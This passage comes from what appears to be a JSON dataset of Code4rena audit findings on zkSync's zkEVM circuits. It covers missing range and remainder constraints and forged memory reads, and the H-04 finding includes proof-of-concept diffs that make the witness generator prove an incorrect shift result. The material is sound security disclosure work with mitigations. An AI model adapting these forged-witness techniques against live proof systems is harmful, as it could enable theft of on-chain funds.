reduction gate, the type we are handling is Variable, which means they can be any element in the prime field.\nwe enforce that `composit_value = (xor_result as u64) << 32 | (or_result as u64) << 16 | (and_result as u64)`. To ensure the decomposited result is indeed what we expected, we also need to make sure all of them are less than 128. So we do a range check here:\n\n    for source_set in all_results.array_chunks::<3>() {\n        // value is irrelevant, it's just a range check\n        let _: [Variable; 1] = cs.perform_lookup::<2, 1>(table_id, &[source_set[0], source_set[1]]);\n    }\n\nHowever, the check only ensures `and_result` and `or_result` are less than 128. In a prime field, for any given `and_result` and `or_result`, there will always be a `xor_result` such that `composit_value = (xor_result as u64) << 32 | (or_result as u64) << 16 | (and_result as u64)`, though the `xor_result` may overflow (`uint8`).\n\n    let xor_results = xor_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });\n\nIn the last step, when we wrap the variable into a `UInt8`, we are using `from_variable_unchecked`, which means there is no overflow check. As a result, if an attacker provides incorrect result for `and_result` and `or_result`, an overflowed `UInt8` `xor_result` will stay in our circuit and unexpected behavior may happen in the future.\n\n### Recommended Mitigation Steps\n\n    // check all three\n    for source_set in all_results.array_chunks::<3>() {\n        // value is irrelevant, it's just a range check\n        let _: [Variable; 1] = cs.perform_lookup::<2, 1>(table_id, &[source_set[0], source_set[1]]);\n        let _: [Variable; 1] = cs.perform_lookup::<2, 1>(table_id, &[source_set[1], source_set[2]]);\n    }\n\n### Assessed type\n\nMath\n\n**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/679#issuecomment-1794557922)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/679#issuecomment-1826872034):**\n > The Warden has found a missing constraint for `binop`, due to a lack in an overflow check, malicious parameters could be passed in the circuit.\n\n***\n\n",
      "summary": "\nThe bug report discusses a problem with the range check in the binop's reduction gate. This can lead to an attacker being able to manipulate the results for certain operations and potentially cause unexpected behavior. The report includes a proof of concept and recommended steps for mitigation. The bug falls under the category of \"Math\" and has been confirmed by a member of the zkSync team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/679",
      "tags": [],
      "finders": [
        "xuwinnie"
      ]
    },
    {
      "id": "30277",
      "title": "[H-04] Missing constraint on remainder in `shr` opcode implementation",
      "impact": "HIGH",
      "content": "\nThe `main_vm` circuit uses a `MulDivRelation` to constrain the result of a `shr` instruction by converting a right shift into a division by a shift constant.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/era-zkevm_circuits/src/main_vm/opcodes/shifts.rs#L76>\n\n```rust\nlet full_shift_limbs = get_shift_constant(cs, full_shift);\n...\nlet (rshift_q, _rshift_r) = allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);\n...\n// actual enforcement:\n// for left_shift: a = reg, b = full_shuft, remainder = 0, high = lshift_high, low = lshift_low\n// for right_shift : a = rshift_q, b = full_shift, remainder = rshift_r, high = 0, low = reg\nlet uint256_zero = UInt256::zero(cs);\n\nlet rem_to_enforce =\n    UInt32::parallel_select(cs, apply_left_shift, &uint256_zero.inner, &_rshift_r);\nlet a_to_enforce = UInt32::parallel_select(cs, apply_left_shift, reg, &rshift_q);\nlet b_to_enforce = full_shift_limbs;\nlet mul_low_to_enforce = UInt32::parallel_select(cs, apply_left_shift, &lshift_low, reg);\nlet mul_high_to_enforce =\n    UInt32::parallel_select(cs, apply_left_shift, &lshift_high, &uint256_zero.inner);\n\nlet mul_relation = MulDivRelation {\n    a: a_to_enforce,\n    b: b_to_enforce,\n    rem: rem_to_enforce,\n    mul_low: mul_low_to_enforce,\n    mul_high: mul_high_to_enforce,\n};\n```\n\nHowever, the circuit fails to constrain the remainder to be less than the divisor. This allows a malicious prover to set the result to any value less than or equal to the correct result (and possibly any value, but this has not be verified).\n\n### Impact\n\nA malicious validator could generate and submit a proof with incorrect behavior of the `shr` instruction. This would allow the validator to manipulate the behavior of smart contracts that use a `shr` instruction. For example, the validator could manipulate the calculated price during the execution of an on-chain DEX and steal all of the assets in the DEX. The elliptic curve precompiles also to make extensive use of shift instructions. Since every smart contract that uses a `shr` instruction is affected, it is impossible to enumerate all potential impacts.\n\nThis vulnerability also affects the deployed circuits that utilize bellman instead of boojum.\n\n### Proof of Concept\n\nFor the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code: <https://github.com/chainlight-io/zksync-era-boojum-test-harness>. The patch below can be applied to the test code to demonstrate the vulnerability:\n\n<details>\n\n```diff\ndiff --git a/run.sh b/run.sh\nindex 91e97da..97e2d3b 100644\n--- a/run.sh\n+++ b/run.sh\n@@ -1,2 +1,3 @@\n #!/bin/sh\n-cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 -- --nocapture run_simple\n+# XXX must run as release to avoid debug asserts\n+cd zkevm_test_harness && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_simple && RUST_MIN_STACK=$((8*1024*1024)) cargo test --jobs 1 --release -- --nocapture run_hack\ndiff --git a/zk_evm/src/opcodes/execution/shift.rs b/zk_evm/src/opcodes/execution/shift.rs\nindex 010181a..56fbd5f 100644\n--- a/zk_evm/src/opcodes/execution/shift.rs\n+++ b/zk_evm/src/opcodes/execution/shift.rs\n@@ -52,7 +52,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {\n                 result = result | src0.shl(256u32 - shift_abs as u32);\n             }\n \n-            result\n+            if src0 == U256::from(1337u32) {\n+                U256::zero()\n+            } else {\n+                result\n+            }\n         } else {\n             let mut result = src0.shl(shift_abs as u32);\n             if is_cyclic {\ndiff --git a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\nindex dbfbeb3..2251e12 100644\n--- a/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\n+++ b/zkevm_circuits/src/main_vm/opcodes/mul_div.rs\n@@ -169,6 +169,89 @@ pub fn allocate_div_result_unchecked<F: SmallField, CS: ConstraintSystem<F>>(\n     (quotient, remainder)\n }\n \n+pub fn allocate_div_result_unchecked_hack<F: SmallField, CS: ConstraintSystem<F>>(\n+    cs: &mut CS,\n+    a: &[UInt32<F>; 8],\n+    b: &[UInt32<F>; 8],\n+) -> ([UInt32<F>; 8], [UInt32<F>; 8]) {\n+    let quotient = cs.alloc_multiple_variables_without_values::<8>();\n+    let remainder = cs.alloc_multiple_variables_without_values::<8>();\n+\n+    if <CS::Config as CSConfig>::WitnessConfig::EVALUATE_WITNESS {\n+        let value_fn = move |inputs: [F; 16]| {\n+            let a = allocate_u256_from_limbs(&inputs[0..8]);\n+            let b = allocate_u256_from_limbs(&inputs[8..16]);\n+\n+            let (quotient, remainder) = if a == U256::from(1337u32) {\n+                (U256::zero(), a)\n+            } else if b.is_zero() {\n+                (U256::zero(), U256::zero())\n+            } else {\n+                a.div_mod(b)\n+            };\n+\n+            let mut outputs = [F::ZERO; 16];\n+            for (dst, src) in outputs[..8]\n+                .iter_mut()\n+                .zip(decompose_u256_as_u32x8(quotient).into_iter())\n+            {\n+                *dst = F::from_u64_unchecked(src as u64);\n+            }\n+            for (dst, src) in outputs[8..]\n+                .iter_mut()\n+                .zip(decompose_u256_as_u32x8(remainder).into_iter())\n+            {\n+                *dst = F::from_u64_unchecked(src as u64);\n+            }\n+\n+            outputs\n+        };\n+\n+        let dependencies = Place::from_variables([\n+            a[0].get_variable(),\n+            a[1].get_variable(),\n+            a[2].get_variable(),\n+            a[3].get_variable(),\n+            a[4].get_variable(),\n+            a[5].get_variable(),\n+            a[6].get_variable(),\n+            a[7].get_variable(),\n+            b[0].get_variable(),\n+            b[1].get_variable(),\n+            b[2].get_variable(),\n+            b[3].get_variable(),\n+            b[4].get_variable(),\n+            b[5].get_variable(),\n+            b[6].get_variable(),\n+            b[7].get_variable(),\n+        ]);\n+        let outputs = Place::from_variables([\n+            quotient[0],\n+            quotient[1],\n+            quotient[2],\n+            quotient[3],\n+            quotient[4],\n+            quotient[5],\n+            quotient[6],\n+            quotient[7],\n+            remainder[0],\n+            remainder[1],\n+            remainder[2],\n+            remainder[3],\n+            remainder[4],\n+            remainder[5],\n+            remainder[6],\n+            remainder[7],\n+        ]);\n+        cs.set_values_with_dependencies(&dependencies, &outputs, value_fn);\n+    }\n+\n+    let quotient = quotient.map(|el| unsafe { UInt32::from_variable_unchecked(el) });\n+    let remainder = remainder.map(|el| unsafe { UInt32::from_variable_unchecked(el) });\n+\n+    (quotient, remainder)\n+}\n+\n pub fn all_limbs_are_zero<F: SmallField, CS: ConstraintSystem<F>>(\n     cs: &mut CS,\n     limbs: &[UInt32<F>; 8],\ndiff --git a/zkevm_circuits/src/main_vm/opcodes/shifts.rs b/zkevm_circuits/src/main_vm/opcodes/shifts.rs\nindex e3260fd..8049876 100644\n--- a/zkevm_circuits/src/main_vm/opcodes/shifts.rs\n+++ b/zkevm_circuits/src/main_vm/opcodes/shifts.rs\n@@ -79,7 +79,7 @@ pub(crate) fn apply_shifts<F: SmallField, CS: ConstraintSystem<F>>(\n         let x = is_cyclic.negated(cs);\n         is_right.and(cs, x)\n     };\n-    let (rshift_q, _rshift_r) = allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);\n+    let (rshift_q, _rshift_r) = allocate_div_result_unchecked_hack(cs, &reg, &full_shift_limbs);\n \n     let apply_left_shift = {\n         let x = is_right_shift.negated(cs);\ndiff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rs\nindex 76ac16c..47a28cb 100644\n--- a/zkevm_test_harness/src/tests/run_manually.rs\n+++ b/zkevm_test_harness/src/tests/run_manually.rs\n@@ -41,6 +41,39 @@ fn run_simple() {\n         log.event.first r1, r2, r0\n         log.to_l1.first r1, r2, r0\n \n+        add! 1336, r0, r1\n+        add! 1, r0, r2\n+        shr r1, r2, r3\n+        sstore r3, r0\n+\n+        ret.ok r0\n+    \"#;\n+\n+    run_and_try_create_witness_inner(asm, 50);\n+}\n+\n+#[test]\n+fn run_hack() {\n+    let asm = r#\"\n+        .text\n+        .file\t\"Test_26\"\n+        .rodata.cst32\n+        .p2align\t5\n+        .text\n+        .globl\t__entry\n+    __entry:\n+    .main:\n+        add 1, r0, r1\n+        add 2, r0, r2\n+        sstore r1, r2\n+        log.event.first r1, r2, r0\n+        log.to_l1.first r1, r2, r0\n+\n+        add! 1337, r0, r1\n+        add! 1, r0, r2\n+        shr r1, r2, r3\n+        sstore r3, r0\n+\n         ret.ok r0\n     \"#;\n```\n\n</details>\n\nWe demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value `1337` is in a source operand. There are two tests that will run: source value of `1336` to show the normal behavior, and source value of `1337` to show the vulnerable behavior.\n\nThe relevant output of `run.sh` is the VM registers during the execution trace and is included below:\n\n    Made snapshot at cycle 1029\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336 <-- dividend and divisor\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 1 <-- quotient\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0 <-- remainder\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    ...\n\n    Made snapshot at cycle 1029\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337 <-- dividend and divisor\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337\n    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 0 <-- quotient\n    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 1337 <-- remainder\n    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0\n    ...\n\nWe see that the result of the `shr` instruction in the normal example is as expected: `1336 >> 1 = 668`. However, in the vulnerable example, the result is incorrect: `1337 >> 1 = 0`. While we chose to set the result to zero, it could be other values as well.\n\n### Proof of Concept (deployed version)\n\nThe current zkSync Era circuits are built on bellman and franklin-crypto, but are similar in logic to the in-scope circuits built on boojum. We confirmed that this vulnerability is also present in the current circuits with a similar demonstration.\n\nFor the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code: <https://github.com/chainlight-io/zksync-era-bellman-test-harness>. The patch below can be applied to the test code to demonstrate the vulnerability:\n\n<details>\n\n```diff\ndiff --git a/run.sh b/run.sh\nindex 0d6b823..b897364 100644\n--- a/run.sh\n+++ b/run.sh\n@@ -1,2 +1,2 @@\n #!/bin/sh\n-cd zkevm_test_harness && cargo test -- --nocapture run_simple\n+cd zkevm_test_harness && cargo test -- --nocapture run_simple && cargo test -- --nocapture run_hack\ndiff --git a/sync_vm/src/vm/optimizer/optimization_context.rs b/sync_vm/src/vm/optimizer/optimization_context.rs\nindex 5c6b972..e242f18 100644\n--- a/sync_vm/src/vm/optimizer/optimization_context.rs\n+++ b/sync_vm/src/vm/optimizer/optimization_context.rs\n@@ -888,6 +888,29 @@ impl<E: Engine> OptimizationContext<E> {\n         }\n     }\n \n+    fn make_witness_for_division_hack(\n+        a: &AsU128x2<E>,\n+        b: &AsU64x4<E>,\n+    ) -> (Option<BigUint>, Option<BigUint>) {\n+        match (a.get_value(), b.get_value()) {\n+            (Some(a), Some(b)) => {\n+                use num_traits::Zero;\n+                if b.is_zero() {\n+                    (Some(BigUint::from(0u64)), Some(a))\n+                } else {\n+                    if a == BigUint::from(1337u32) {\n+                        (Some(BigUint::from(0u64)), Some(a))\n+                    } else {\n+                        use num_integer::Integer;\n+                        let (q, r) = a.div_rem(&b);\n+                        (Some(q), Some(r))\n+                    }\n+                }\n+            }\n+            _ => (None, None),\n+        }\n+    }\n+\n     #[track_caller]\n     pub fn add_zero_check<CS: ConstraintSystem<E>>(\n         &mut self,\n@@ -1104,6 +1127,40 @@ impl<E: Engine> OptimizationContext<E> {\n         Ok((quotient.into(), remainder.into()))\n     }\n \n+    #[track_caller]\n+    pub fn add_div_relation_shift<CS: ConstraintSystem<E>>(\n+        &mut self,\n+        cs: &mut CS,\n+        dividend_view: &RegisterInputView<E>,\n+        divisor_view: &RegisterInputView<E>,\n+        applies: Boolean,\n+        marker: CtxMarker,\n+    ) -> Result<(RegisterInputView<E>, RegisterInputView<E>), SynthesisError> {\n+        let dividend = AsU128x2::from(dividend_view);\n+        let divisor = AsU64x4::from(divisor_view);\n+\n+        let (witness_quotient, witness_remainder) =\n+            Self::make_witness_for_division_hack(&dividend, &divisor);\n+        let quotient =\n+            BothReprs::alloc_checked(cs, witness_quotient, applies.clone(), self, marker)?;\n+        let remainder =\n+            BothReprs::alloc_checked(cs, witness_remainder, applies.clone(), self, marker)?;\n+\n+        // a, b, high, low, remainder\n+        // for a relationship like a*b + remainder = 2^256 * high + low\n+        // and here we have for a/b = q and a%b = r\n+        // q*m + r = 2^256 * 0 + input\n+        let relation = MulDivRelationship::new(\n+            divisor,\n+            quotient.as_u64x4.clone(),\n+            remainder.as_u128x2.clone(),\n+            AsU128x2::zero(),\n+            dividend,\n+        );\n+        self.uint256_divmul_tuples.push((marker, applies, relation));\n+        Ok((quotient.into(), remainder.into()))\n+    }\n+\n     #[track_caller]\n     pub fn add_pending_div_relation<CS: ConstraintSystem<E>>(\n         &mut self,\ndiff --git a/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs b/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs\nindex 7aa8707..eeac589 100644\n--- a/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs\n+++ b/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs\n@@ -141,7 +141,7 @@ pub(crate) fn apply<\n     let is_right_shift = Boolean::and(cs, &is_right, &is_cyclic.not())?;\n     let apply_right_shift = Boolean::and(cs, &should_apply, &is_right_shift)?;\n     let (rshift_q, _rshift_r) =\n-        optimizer.add_div_relation(cs, &reg, &full_shift, apply_right_shift, marker)?;\n+        optimizer.add_div_relation_shift(cs, &reg, &full_shift, apply_right_shift, marker)?;\n \n     // for left_shift: a = reg, b = full_shuft, remainder = 0, high = lshift_high, low = lshift_low\n     let next_marker = marker.advance();\ndiff --git a/zk_evm/src/opcodes/execution/shift.rs b/zk_evm/src/opcodes/execution/shift.rs\nindex 9db48e0..bff9c4e 100644\n--- a/zk_evm/src/opcodes/execution/shift.rs\n+++ b/zk_evm/src/opcodes/execution/shift.rs\n@@ -50,7 +50,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {\n                 result = result | src0.shl(256u32 - shift_abs as u32);\n             }\n \n-            result\n+            if src0 == U256::from(1337u32) {\n+                U256::from(0u32)\n+            } else {\n+                result\n+            }\n         } else {\n             let mut result = src0.shl(shift_abs as u32);\n             if is_cyclic {\ndiff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rs\nindex f640615..ef96e22 100644\n--- a/zkevm_test_harness/src/tests/run_manually.rs\n+++ b/zkevm_test_harness/src/tests/run_manually.rs\n@@ -40,6 +40,39 @@ fn run_simple() {\n         log.event.first r1, r2, r0\n         log.to_l1.first r1, r2, r0\n \n+        add! 1336, r0, r1\n+        add! 1, r0, r2\n+        shr r1, r2, r3\n+        sstore r3, r0\n+\n+        ret.ok r0\n+    \"#;\n+\n+    run_and_try_create_witness_inner(asm, 50);\n+}\n+\n+#[test]\n+fn run_hack() {\n+    let asm = r#\"\n+        .text\n+        .file\t\"Test_26\"\n+        .rodata.cst32\n+        .p2align\t5\n+        .text\n+        .globl\t__entry\n+    __entry:\n+    .main:\n+        add 1, r0, r1\n+        add 2, r0, r2\n+        sstore r1, r2\n+        log.event.first r1, r2, r0\n+        log.to_l1.first r1, r2, r0\n+\n+        add! 1337, r0, r1\n+        add! 1, r0, r2\n+        shr r1, r2, r3\n+        sstore r3, r0\n+\n         ret.ok r0\n     \"#;\n```\n\n</details>\n\nWe demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value `1337` is in a source operand. There are two tests that will run: source value of `1336` to show the normal behavior, and source value of `1337` to show the vulnerable behavior.\n\nThe relevant output of `run.sh` is the VM registers during the execution trace and is included below:\n\n    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1336 <-- value to shift\n    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1 <-- shift amount\n    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0\n    Made snapshot at cycle 1034\n    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1336\n    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1\n    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 668 <-- result\n    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0\n    ...\n\n    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1337 <-- value to shift\n    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1 <-- shift amount\n    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0\n    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0\n    Made snapshot at cycle 1034\n    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1337\n    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1\n    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0 <-- result\n    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0\n    ...\n\nWe see that the result of the `shr` instruction in the normal example is as expected: `1336 >> 1 = 668`. However, in the vulnerable example, the result is incorrect: `1337 >> 1 = 0`. While we chose to set the result to zero, it could be other values as well.\n\n### Recommended Mitigation Steps\n\nThe `div` instruction already has code to enforce the remainder to be less than the divisor. This code could be copied to the `shr` implementation, keeping in mind to fix the vulnerability we identified in the `div` implementation:\n\n```rust\nlet (rshift_q, rshift_r) = allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);\nlet (subtraction_result_unchecked, remainder_is_less_than_divisor) =\n    allocate_subtraction_result_unchecked(cs, &rshift_r, &full_shift_limbs);\nlet subtraction_result = subtraction_result_unchecked.map(|el| UInt32::from_variable_checked(cs, el.get_variable()));\n\n// relation is a + b == c + of * 2^N,\n// but we compute d - e + 2^N * borrow = f\n\n// so we need to shuffle\nlet addition_relation = AddSubRelation {\n    a: full_shift_limbs,\n    b: subtraction_result,\n    c: rshift_r,\n    of: remainder_is_less_than_divisor,\n};\n\n// for right shift, we require that remainder is < divisor\nremainder_is_less_than_divisor.conditionally_enforce_true(cs, is_right_shift);\n```\n\n### Recommended Mitigation Steps (deployed version)\n\nThe `div` instruction already has code to enforce the remainder to be less than the divisor. This code could be copied to the `shr` implementation.\n\n```rust\nlet mut full_shift = RegisterInputView {\n    u8x32_view: None,\n    lowest160: None,\n    decomposed_lowest160: None,\n    u64x4_view: Some([chunk0, chunk1, chunk2, chunk3]),\n    u128x2_view: Some(AsU128x2::from_uint256(cs, &UInt256 {\n        inner: [chunk0, chunk1, chunk2, chunk3],\n    })?.inner),\n    u32x8_view: None,\n    is_ptr: Boolean::Constant(false),\n};\n...\nlet (rshift_q, rshift_r) =\n    optimizer.add_div_relation_shift(cs, &reg, &full_shift, apply_right_shift, marker)?;\n// add check that remainder is smaller than divisor (if it is not zero)\n// divisor - remainder + 2^256 * borrow = c =>\n// c + remainder = divisor + borrow * 2^256;\nlet (_result, borrow) =\n    optimizer.add_subtraction_relation(cs, &full_shift, &rshift_r, apply_right_shift, marker)?;\n\n// borrow == 0 enforces only that remainder <= divisor\n// however we want to enforce that remainder < divisor\n// to accomplish the latter we additionally check that remainder != divisor\n// the full condition therefore is the following:\n// divisor !=0 => borrow == 0 && remainder != divisor\n// which is equivalent to: divisor_is_zero || (borrow == 0 && remainder != divisor)\n\nlet divisor = full_shift.clone().unwrap_as_register();\nlet remainder = rshift_r.unwrap_as_register();\nlet rem_eq_divisor = Register::equals(cs, &divisor, &remainder)?;\nlet rem_is_less_than_divisor = Boolean::and(cs, &borrow.not(), &rem_eq_divisor.not())?;\nlet first_check = Boolean::or(cs, &is_right_shift.not(), &rem_is_less_than_divisor)?;\nBoolean::enforce_equal(cs, &first_check, &Boolean::constant(true))?;\n```\n\n**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/697#issuecomment-1794649061)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/697#issuecomment-1830113270):**\n > The Warden has shown how, due to a lack of a constraint, the circuit for `shr` would allow any value that is less than or equal to the correct remainder.\n> \n> The bug has been weaponized to show how it would have allowed incorrect proofs, which may have been used to steal funds or break contracts on-chain.\n\n***\n\n",
      "summary": "\nThe `main_vm` circuit has a bug that allows a malicious prover to manipulate the behavior of smart contracts that use a `shr` instruction. The bug is caused by a missing constraint in the `MulDivRelation`, which converts a right shift into a division by a shift constant. This circuit fails to constrain the remainder to be less than the divisor, allowing the malicious prover to set the result to any value less than or equal to the correct result. This results in incorrect proofs that could be used to steal funds or break contracts on-chain. The bug affects all smart contracts that use a `shr` instruction and also affects the deployed circuits that utilize bellman instead of boojum. A proof of concept was provided to demonstrate the vulnerability in the test harness code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/697",
      "tags": [],
      "finders": [
        "chainlight",
        "xuwinnie",
        "anon"
      ]
    },
    {
      "id": "30276",
      "title": "[H-03] Attacker can forge arbitrary read value from memory in case `skip_if_legitimate_fat_ptr`",
      "impact": "HIGH",
      "content": "\nAttempting to read a word that spans across the pointer bound start`+`offset should return zero bytes for the addresses. When offset `>=` length, the result should be completely zeros, so we can skip the read. However, in current implementation, this case is not handled properly so that attacker can forge arbitrary read result.\n\n### Proof of Concept\n\nLet's see what happens when `skip_if_legitimate_fat_ptr`.\n\n        let (_, offset_is_strictly_in_slice) = offset.overflowing_sub(cs, length);\n        let offset_is_beyond_the_slice = offset_is_strictly_in_slice.negated(cs);\n        let skip_if_legitimate_fat_ptr =\n            Boolean::multi_and(cs, &[offset_is_beyond_the_slice, is_fat_ptr]);\n        ......\n        let skip_memory_access = Boolean::multi_or(\n            cs,\n            &[\n                already_panicked,\n                skip_if_legitimate_fat_ptr,\n                is_non_addressable,\n            ],\n        );\n\nWe skip memory access if offset `>=` length.\n\n        bytes_out_of_bound = bytes_out_of_bound.mask_negated(cs, skip_memory_access);\n        bytes_out_of_bound = bytes_out_of_bound.mask_negated(cs, uf);\n\n        let (_, bytes_out_of_bound) = bytes_out_of_bound.div_by_constant(cs, 32);\n        // remainder fits into 8 bits too\n        let bytes_to_cleanup_out_of_bounds =\n            unsafe { UInt8::from_variable_unchecked(bytes_out_of_bound.get_variable()) };\n\n        let new = Self {\n            absolute_address,\n            page_candidate: page,\n            incremented_offset,\n            heap_deref_out_of_bounds: is_non_addressable,\n            skip_memory_access: skip_memory_access,\n            should_set_panic,\n            bytes_to_cleanup_out_of_bounds,\n        };\n\n`bytes_out_of_bound` will be masked zero and `bytes_to_cleanup_out_of_bounds` will also be zero.\n\n    let apply_any = Boolean::multi_and(cs, &[should_apply, no_panic]);\n    let update_dst0 = Boolean::multi_or(cs, &[is_read_access, is_write_access_and_increment]);\n    let should_update_dst0 = Boolean::multi_and(cs, &[apply_any, update_dst0]);\n    diffs_accumulator\n        .dst_0_values\n        .push((can_write_into_memory, should_update_dst0, dst0_value));\n\nThis case is not treated specially and will not panic, so finally we will push it to `dst0`. (We should push zeros!)\n\n    // implement shift register\n    let zero_u8 = UInt8::zero(cs);\n    let mut bytes_array = [zero_u8; 64];\n\n    let memory_value_a_bytes = memory_value_a.value.to_be_bytes(cs);\n    bytes_array[..32].copy_from_slice(&memory_value_a_bytes);\n\n    let memory_value_b_bytes = memory_value_b.value.to_be_bytes(cs);\n    bytes_array[32..].copy_from_slice(&memory_value_b_bytes);\n    // now mask-shift\n    let mut selected_word = [zero_u8; 32];\n\n    // idx 0 is unalignment of 0 (aligned), idx 31 is unalignment of 31\n    for (idx, mask_bit) in unalignment_bit_mask.iter().enumerate() {\n        let src = &bytes_array[idx..(idx + 32)]; // source\n        debug_assert_eq!(src.len(), selected_word.len());\n\n        for (dst, src) in selected_word\n            .array_chunks_mut::<4>()\n            .zip(src.array_chunks::<4>())\n        {\n            *dst = UInt8::parallel_select(cs, *mask_bit, src, &*dst);\n        }\n\n    use crate::tables::uma_ptr_read_cleanup::UMAPtrReadCleanupTable;\n\n    let table_id = cs\n        .get_table_id_for_marker::<UMAPtrReadCleanupTable>()\n        .expect(\"table must exist\");\n    let bytes_to_cleanup_out_of_bound = quasi_fat_ptr.bytes_to_cleanup_out_of_bounds;\n    let bytes_to_cleanup_out_of_bound_if_ptr_read =\n        bytes_to_cleanup_out_of_bound.mask(cs, is_uma_fat_ptr_read);\n    let [uma_cleanup_bitspread, _] = cs.perform_lookup::<1, 2>(\n        table_id,\n        &[bytes_to_cleanup_out_of_bound_if_ptr_read.get_variable()],\n    );\n    let uma_ptr_read_cleanup_mask =\n        Num::from_variable(uma_cleanup_bitspread).spread_into_bits::<_, 32>(cs);\n\n    for (dst, masking_bit) in selected_word\n        .iter_mut()\n        .zip(uma_ptr_read_cleanup_mask.iter().rev())\n    {\n        *dst = dst.mask(cs, *masking_bit);\n    }\n\n    .......\n\n    let dst0_value = VMRegister::conditionally_select(\n        cs,\n        is_write_access_and_increment,\n        &incremented_src0_register,\n        &read_value_as_register,\n    );\n\nAbove are the main steps to get `dst0_value`. At first we read two consecutive words from memory. Then we choose the selected word inside them. Finally, we mask it by `uma_cleanup_bitspread`. The problem is we neither actually read from memory nor mask the value.\n\n    let should_read_a_cell = Boolean::multi_and(cs, &[should_apply, do_not_skip_memory_access]);\n    let should_read_b_cell = is_unaligned_read;\n\nWe do not read from memory, which means the memory sponge will not be enforced.\n\n    let table_id = cs\n        .get_table_id_for_marker::<UMAPtrReadCleanupTable>()\n        .expect(\"table must exist\");\n    let bytes_to_cleanup_out_of_bound = quasi_fat_ptr.bytes_to_cleanup_out_of_bounds;\n    let bytes_to_cleanup_out_of_bound_if_ptr_read =\n        bytes_to_cleanup_out_of_bound.mask(cs, is_uma_fat_ptr_read);\n    let [uma_cleanup_bitspread, _] = cs.perform_lookup::<1, 2>(\n        table_id,\n        &[bytes_to_cleanup_out_of_bound_if_ptr_read.get_variable()],\n    );\n    let uma_ptr_read_cleanup_mask =\n        Num::from_variable(uma_cleanup_bitspread).spread_into_bits::<_, 32>(cs);\n\nWe don't mask neither, since `bytes_to_cleanup_out_of_bounds` is zero.\n\nThis two facts mean that we (attacker) can put whatever value into `dst0_value`. The principle that *\"if memory state is not enforced, the memory value should not be used\"* is not followed here.\n\n### Recommended Mitigation Steps\n\nWhen `skip_if_legitimate_fat_ptr`, `bytes_to_cleanup_out_of_bounds` should be set to 32.\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/702#issuecomment-1794650170)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/702#issuecomment-1829754023):**\n > The 